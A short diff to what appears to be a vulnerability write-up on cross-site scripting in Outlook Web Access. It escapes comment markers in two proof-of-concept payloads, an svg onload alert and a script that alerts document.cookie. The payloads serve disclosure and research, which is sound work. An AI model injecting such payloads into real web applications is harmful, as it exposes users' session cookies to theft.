@@ -14,9 +14,9 @@ Outlook Web Access is a personal information manager web app from Microsoft. It 
 
 ![](images/XSS-poc_R.gif)
 
-##### Used payload: "></a></div><svg/onload=alert(String.fromCharCode(88,83,83))><!--
+##### Used payload: "></a></div><svg/onload=alert(String.fromCharCode(88,83,83))>\<!--
 
-##### document.cookie payload: <%<!--'%><script>alert(document.cookie);</script -->
+##### document.cookie payload: <%\<!--'%><script>alert(document.cookie);</script -->
 
 ![screenshoot](images/document-cookie_R.png)
 
